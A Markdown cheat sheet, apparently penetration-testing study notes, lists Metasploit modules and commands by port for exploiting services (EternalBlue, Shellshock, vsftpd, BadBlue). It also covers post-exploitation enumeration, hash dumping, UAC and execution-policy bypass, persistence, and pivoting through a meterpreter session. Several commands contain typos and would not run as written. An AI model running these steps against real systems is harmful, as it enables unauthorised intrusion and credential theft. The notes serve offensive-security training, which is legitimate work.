# Linux and Windows

# Linux exploit
__21 FTP server vsftpd2.3.4__
- __`ftp <ip>`__
  - __`search vsftpd`__
  - [ftp](ftp.md)

__22 ssh server__
- __`ssh root@10.0.1.22`__
- __`nc 10.0.1.22 22` To Fetch the banner__ 
  - __`search libssh_auth_bypass`__
  - [SSH](ssh.md)

25, 465, 587 SMTP Haraka smtpd 
  - __`search type:exploit name:haraka`__
  - [SMTP](smtp.md)
  - 
445, 139 (SMB uses 445 however originally SMB ran on top of NetBIOS using 139) ---> samba v3.5.0
- __`search type:exploit name:samba`__
- [SMB](smb.md) windows
- [SMB@](Q&A/SMB.md)
- [SAMBA](/Q&A/samba.txt)




# Windows exploit

- Full automatice enumaration for windows [JAWS](https://github.com/411Hall/JAWS)
  - > __you should have access to the target system__
  - __copy the code from the `jaws-enum.ps1` fiel And the save the file as `jaws-enum.ps1`__
  - __upload the file in target system using meterpreter `upload /root/jaws-enum.psq`__
  - __`powershell.exe -ExecutionPloicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`__
  - __when your done with execution the output will save in the `JAWS-Enum.txt`__
  
162 Simple Network Management Protocol (SNMP)
  - __`search type:exploit psexec`__
  -  [SNMP](/Q&A/SMTP.md)

445 Windows MS17-010 SMB Vulnerability(Eternal Blue)
  - __`search eternalblue`__
  -  [Eternal Blue](/Q&A/Eternal_Blue.md)

5985 or 5986 (winRM vuln) ---> http  Microsoft HTTPAPI httpd 2.0 SSDP/UPnp
  - __`search type:auxiliary winrm`__
  - [WinRM](/Q&A/winrm.md)


8080 Apache Tomcat 
  - __`search type:exploit tomcat`__
  - [Tomcat](/Q&A/tomcat.md)

3389 RDP service
  - __`search rdp platform:windows`__
  - __`use post/windows/manage/enable_rdp`__
  - [RDP_enable](/Q&A/rdp_enable.md)
  - __For more information__
  - [RDP2](/Q&A/rdp.md)
  - [RDP3](/Q&A/rdp2.md)


## Windows privilege escalation [win](/Q&A/windows_exploits.md)
- __1.Bypassing UAC with UACMe (User Account control)__
  - [UAC](/Q&A/UAC.md)
 
## Windows post exploit
- __`search migrate`__
```
use post/windows/manage/migrate
exploit
```
## post exploit in windows 
  __finding the current user logged in__

`use post/windows/gather/enum_logged_on_users`
__and exploit it__

### Establishing Persistence On Windows
  - __`search platform:windows persistence`__
  - [Persistence Connection](/Q&A/persistence.md)

- __To check the permission of a user__
  - __`search win_privs`__
```
use exploit/windows/winrm/winrm_script_exec
```

### 1
- __`search win_privs`__
> __set the `session uid` and exploit it__

### 2
- __`search enum_logged_on`__
> __set the `session uid` and exploit it__
> __here you get the `SID` of current logged in user

### 3
check target system is a vm or not 
  - __`search checkvm`__
  - __`use post/windows/gather/checkvm`__
  > __set the `session uid` and exploit it__

### 4 program install on target system
  - __`search enum_applications`__
  - __`use post/windows/gather/enum_applications`__
  - > __set the session id__

### 5 detect antivirus installed in target system 

  - __`search type:post platform:windows enum_av`__
  - __`use post/windows/gather/enum_av_excluded`__
  - > __set the session id__


### 6 check the targret system which part of the domain

  - __`search enum_computer`__
  - __`use post/windows/gather/enum_computers`__

### 7 chech for the installed patches

  - __`search enum_patches`__
  - __`use post/windows/gather/enum_patches`__
  - > __set the session id__
  - > __if you are facing the error then migrate to someother process useing `ps` 

### 8 Checking for the any shares in the target system 
  - __`search enum_shares`__
  - __`use post/windows/gather/enum_shares`__
  - > __set the session id__

### 9 Checking or Enabling RDP service
  - __`search rdp platform:windows`__
  - __`use post/windows/manage/enable_rdp`__
  - [RDP_enable](/Q&A/rdp_enable.md)
  - __For more information__
  - [RDP2](/Q&A/rdp.md)
  - [RDP3](/Q&A/rdp2.md)


### Dumping hashes with mimikatz
  - [Mimikatz](/Q&A/mimikatz.md)

# Linux post exploit
 ```
use post/linux/gather/hashdump
set session 1
exploit
```
- __use `loot`__ 


# Web

/gettime.cgi Bash CVE-2014-6271 Vulnerability (Shellshock)
  - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
    - __`set TARGETURI /gettime.cig`__
  - [Shellshock](/Q&A/Shellshock.md)

Apache Tomcat 8080
  - __`search type:exploit tomcat`__
  - [tomcat](/Q&A/tomcat.md)

80 XODA running 
  - __`search xoda`__
  - [xoda](/Q&A/xoda.md)

80 http HttpFileServer httpd 2.3 for windows server
  - __`search rejetoo`__

80 BadBlue httpd 2.7 (mimikatz)
  - __`search badblue 2.7`__
  - __`use exploit/windows/http/badblue_passthru`__
  - [Mimikatz](/Q&A/mimikatz.md)


# Windows commands 
- __current logged on user__
  - __`query user`__
  - __it is a windows command__
  - __or you can use `net users`__
  - __`net user <user_name>` for more information on that user__
  - __`use post/windows/gather/enu_logged_on_users`__
  - __`net localgroup`__
  - __`net localgroup administrator`__

- __To know the current privilages__
  - __`whoami /priv`__
  
- __`route print`__


- __Display the all devices connected to the network__
  - __`arp -a`__

- __Display open port on target system__
  - __`netstat -ano`__ 

- __Display the state of the firewall__
  - __`netsh firewall show state`__
  - __or `nesth advfirewall firewall help` it will open help__
    - __`netsh advfirewall firewall dump`__
    - __`netsh advfirewall show allprofiles`__
   

- __service running__
 - __`tasklist /SVC`__

- __schedule task display__
  - __`schtasks /query /fo LIST /v`__
 
# linux
```
hostname
cat /etc/issue
cat /etc/*release
uname -a 
uname -r 
env
lscpu 
free -h 
df -h 
df -ht ext4
lsblk | grep sd 
dpkg -l 
adduser -m royal /bin/bash
groups
groups bob
usermod -aG root bob
lastlog
```


# pivoting
- __Adding target 1 route to your system in meterpreter__
  - > __Note: you must have access to the target 1 in meterpreter__
  - __`run autoroute -s <target_ip_1>.0/20`__
  - __`run autoroute -p` checking that routing is added__
  - > __keep the meterpreter session background so that we can do port scan__
  - __`search portscan` use tcp scan `use auxiliary/scanner/portscn/tcp`__
    - __`set RHOSTS <target_ip_2>` & `set PORTS 1-100`__
    - __If you want to know, what service version is running on that port in target 2 you need to do port forward, because we need nmap, Metasploit can't do it__
    - __`portfwd add -l 1234 -p 80 -r <target_ip_2>`__
      - __`-l 1234` your setting a specific port for port forward you can set any port which is not used by any service__
      - __`-p 80` the actually port which is running in the target 2 that you want to scan more__ 
      - > __Note this port forward should done in meterpreter session__  
    - __After adding the port forward in meterpreter then open a new terminal to perform nmap scan on port `1234`__
    - __`nmap -sV -O -T4 -p 1234 localhost`__
      - __for example you will get badblue service is running on port 80__
      - __go back to the meterpreter and search `search BadBlue`__
      - __`use exploit/windows/http/badblue_passthru`__
        - __`set payload windows/meterpreter/bind_tcp`__
        - __`set RHOSTS <target_ip_2>`__
        - __`exploit`__
        - __`sysinfo` `getuid`__

    



